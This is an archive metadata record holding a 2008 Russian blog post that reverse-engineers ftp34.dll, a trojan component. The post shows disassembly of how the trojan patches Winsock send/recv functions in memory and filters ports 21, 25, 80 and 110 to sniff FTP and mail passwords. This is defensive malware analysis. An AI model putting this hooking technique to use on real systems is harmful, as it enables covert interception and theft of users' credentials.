{
    "id": "16446e60-9a43-4667-91ac-f2e50c50b13e",
    "created_at": "2023-01-12T15:03:57.124244Z",
    "updated_at": "2025-03-27T02:05:56.736895Z",
    "deleted_at": null,
    "sha1_hash": "f106743de38d1cdf56cbd70b0f1ac49e8cc45dcd",
    "title": "2008-06-08 - Потомок «нецензурного» трояна или как воруют пароли на FTP",
    "authors": "",
    "file_creation_date": "2022-05-29T01:12:12Z",
    "file_modification_date": "2022-05-29T01:12:12Z",
    "file_size": 98856,
    "plain_text": "# Потомок «нецензурного» трояна или как воруют пароли на FTP.\n\n**habr.com/ru/post/27053/**\n\nВладимир Мартьянов\n\nВчера я разбирал «нецензурный» троян (http://vilgeforce.habrahabr.ru/blog/44130.html), а\nсегодня разделываю его потомка — ftp34.dll. Эта тваринка, кстати, куда как интереснее\nподавляющего большинства троянов. Хотя бы тем, что ворует информацию не с диска,\nа прямо из сетевого траффика. Как? Смотрите под кат.\n\nВ первой серии был почти до конца разобран один из компонентов комплекса «Троян\nЗалупко». Он дропал на диск файл ftp34.dll и загружал его при помощи LoadLibrary.\nПричем это происходило при каждой активации трояна.\n\nftp34.dll — файл размером 4608 байт, упакован UPX, поэтому в Linux (я дома в линухе)\nраспаковывается за 5 секунд. Распакованный файл весит 7608 байт. DLL, как и ее\nдроппер, использует тот же принципи шифрования строк — XOR одним байтом, код\nфункции тот же. Скрипт для IDA пишется за минуту.\n\nIDA заботливо свернула код точки входа, переместив курсор на DllMain. В DllMain\nпроверяется причина вызова: если производится загрузка библиотеки выполняются\nодни действия, если выгрузка — другие. Так как call'ов для выгрузки было меньше,\nначал с этого куска. В продуре Detach (назовем ее так) — странный код:\n\n\n-----\n\n.text:10001D2F push eax; lpNumberOfBytesWritten\n.text:10001D30 push 6; nSize\n.text:10001D32 push offset unk_1001213C; lpBuffer\n.text:10001D37 push lpBaseAddress; lpBaseAddress\n.text:10001D3D push 0FFFFFFFFh; hProcess\n.text:10001D3F call ds:WriteProcessMemory\n\nи повторяется он 4 раза. Если я ничего не путаю, то hProcess равный -1 означает\nзапись в свое же собственное адресное пространство. Беглый анализ ссылок на\nадреса буфера для чтения и для записи показал, что DLL довольно активно читает/\nпишет в них при помощи Read/WriteProcessMemory. Открытый вопрос «Зачем?»\nоставлю на потом.\n\n**Действия при загрузке**\nКак и свой «родитель», эта библиотека подготавливает строки, содержащие пути к\nнужным файлам: %TEMP%\\r43q34.tmp и %TEMP%\\mpz.tmp. Присутствие в системе\nдругих экземпляров библиотеки определяется при помощь мьютекса, и если его нет,\nсоздается поток Thread1. Имена мьютексов я не привожу, ибо сомневаюсь, что кто-то\nбудет проверять систему на их наличие :-) Теперь — самое интересное! Библиотека\nПАТЧИТ функции Windows Sockets в памяти. Как это происходит? Вот код:\n\n.text:10001B72 push 4; int\n.text:10001B74 push offset aSw676Hh; «ws2_32.dll»\n.text:10001B79 call decryptXor\n.text:10001B7E pop ecx\n.text:10001B7F pop ecx\n.text:10001B80 push eax; lpModuleName\n.text:10001B81 call ds:GetModuleHandleA; Получаем хэнд ws2_32.dll\n.text:10001B87 mov [ebp+ws2_32handle], eax\n.text:10001B8A push 5; int\n.text:10001B8C push offset aWFs; «recv»\n.text:10001B91 call decryptXor\n.text:10001B96 pop ecx\n.text:10001B97 pop ecx\n.text:10001B98 push eax; lpProcName\n.text:10001B99 push [ebp+ws2_32handle]; hModule\n.text:10001B9C call ds:GetProcAddress; Получаем адрес функции recv\n.text:10001BA2 mov recvAddr, eax\n.text:10001BA7 lea eax, [ebp+NumberOfBytesWritten]\n.text:10001BAA push eax; lpNumberOfBytesRead\n.text:10001BAB push 6; nSize\n.text:10001BAD push offset originalCode; lpBuffer\n.text:10001BB2 push recvAddr; lpBaseAddress\n\n\n-----\n\n.text:10001BB8 push 0FFFFFFFFh; hProcess\n.text:10001BBA call ds:ReadProcessMemory; Читаем в буфер originalCode первые 6 байт\nфункции recv\n.text:10001BC0 mov HookCode, 68h; В буфер, записываемый в начало recv() помещаем\nопкод команды push\n.text:10001BC7 mov dword ptr HookCode+1, offset newRecv; Следом за push — адрес\nнашего нового обработчика\n.text:10001BD1 mov HookCode+5, 0C3h; И теперь RET\n.text:10001BD8 lea eax, [ebp+NumberOfBytesWritten]\n.text:10001BDB push eax; lpNumberOfBytesWritten\n.text:10001BDC push 6; nSize\n.text:10001BDE push offset HookCode; lpBuffer\n.text:10001BE3 push recvAddr; lpBaseAddress\n.text:10001BE9 push 0FFFFFFFFh; hProcess\n.text:10001BEB call ds:WriteProcessMemory; Пишем нашу вставку на начало recv(). Дело\nсделано!\n\nУвы, получился он куда как менее читаемым, нежели в IDA :-( Вкратце: получили адрес\nнужной функции. Считали с этого адреса 6 байт, подготовили буфер с кодом\n\npush offset myRecv\nret\n\nи записали его в начало перехватываемой процедуры. Комбинация push-ret — переход\nна нужный нам адрес не совсем очевидным способом. Перехватываются следующие\nфункции: recv(), WSARecv(), WSASend(), send(). Теперь стало ясно, что такое пишется\nв память при выгрузке DLLки: это восстанавливается оригинальный код\nперехватываемых функций. Остался главный вопрос — как передается управление на\nоригинальные функции? И что же с Thread1? Она устанавливает свой обработчик\n(который, кстати, ничего криминального не далет) при помощи SetWindowsHookEx.\nЗачем? Точно не знаю… Но да это, думаю, не важно.\n\n**Функции перехватчиков**\nУ всех перехватчиков много общего: это короткие процедуры, содержащие, грубо\nговоря, только 2 вызова. Первый вызов одинаков для перехватчиков send() и\nWSASend(), а второй — для recv() и WSARecv(), то есть разделение по функционалу.\nНазову эти две функции HookSend и HookRecv соответственно. Второй вызов в\nперехватчиках разный, это вызов функции, которая патчит перехватываемые функции\nдо исходного состояния, вызывает их, а потом патчит в вариант с перехватчиком.\nФункции HookSend() и HookRecv() получают три параметра — сокет, буфер и длину.\nНачальный код тоже совпадает: получаем адрес, к которому подключен сокет,\nпреобразовываем этот адрес в строку, а также переводит адрес из сетевого порядка\nследования байт в хостовый. Тут возникает не совсем понятный мне момент:\n\n\n-----\n\n.text:100015CA push [ebp+s]; s\n.text:100015CD call ds:getpeername\n.text:100015D3 push dword ptr [ebp+name.sa_data+2]; in\n.text:100015D6 call ds:inet_ntoa\n.text:100015DC push eax; Source\n.text:100015DD push offset byte_10011C10; Dest\n.text:100015E2 call strcpy\n.text:100015E7 pop ecx\n.text:100015E8 pop ecx\n.text:100015E9 push dword ptr [ebp-12h]; netshort\n.text:100015EC call ds:ntohs\n.text:100015F2 movzx eax, ax\n.text:100015F5 cmp eax, 25\n.text:100015F8 jnz short loc_10001607\n\ns — сокет. Не понимаю, как мы после вызова ntohs в ax получаем порт? Или там\nдействительно порт будет и я плохо доки читал? В общем, интуиция и знакомые числа\n(25, 80, 110 :-) подсказали, что идет проверка порта, к которому осуществлен коннект.\nДля приема перехватывается траффик по следующим портам: 25, 80, 110. Для\nпередачи: 25, 80, 21. Причем траффик 21-го порта обрабатывается как-то хитро.\nПередача по 80-му порту, похоже, вносит некоторые изменения в траффик: если в\nпередаваемых данных встречается строка «gzip,», то она будет заменена на 5 байт с\nкодом 0x6E («n»). Зачем? Не знаю… На этот момент не разобранными остались только\nпроцедуры поиска в передаваемых данных паролей на FTP и почтовых адресов, а\nтакже записи этого добра в файлы. Строк для воровства почтовых паролей не видно,\nравно как и кода, отправлящего собранную информацию по сети. Для этого, наверное,\nесть свои компоненты.\n\nЕсли такая зараза получит распространение, то никакие рекомендации от Пинча типа\n«Не хранить пароли на дисках» не помогут. Остается только переход на шифрованные\nканалы связи. Но учитывая перехват всего траффика это, думаю, слабо поможет :-(\n\nЧто мне во всем этом не ясно и странно:\n1) WriteProcessMemory использует в качестве хэндла -1. Почему сомневаюсь, что\nперехвачены будут вызовы для всех приложений.\n2) Зачем применяется SetWindowsHookEx?\n3) Обнаруживается ли активность трояна поведенческими анализаторами? И вообще\nхоть каким-нибудь софтом (кроме сигнатурного поиска).\n4) Откуда столько людей узнают про мой пост? Меня читает, насколько я знаю, меньше\n10 человек :-D\n\nВремя на анализ — около 2 часов (попутно отвечая на комменты). Инструменты —\nUPX + IDA Pro + OllyDbg (можно было и без него), голова с мозгами.\n\n\n-----",
    "language": "RU",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2003 - 2009/2008-06-08 - Потомок «нецензурного» трояна или как воруют пароли на FTP.pdf"
    ],
    "report_names": [
        "2008-06-08 - Потомок «нецензурного» трояна или как воруют пароли на FTP.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535837,
    "ts_updated_at": 1743041156,
    "ts_creation_date": 1653786732,
    "ts_modification_date": 1653786732,
    "files": {
        "pdf": "https://archive.orkl.eu/f106743de38d1cdf56cbd70b0f1ac49e8cc45dcd.pdf",
        "text": "https://archive.orkl.eu/f106743de38d1cdf56cbd70b0f1ac49e8cc45dcd.txt",
        "img": "https://archive.orkl.eu/f106743de38d1cdf56cbd70b0f1ac49e8cc45dcd.jpg"
    }
}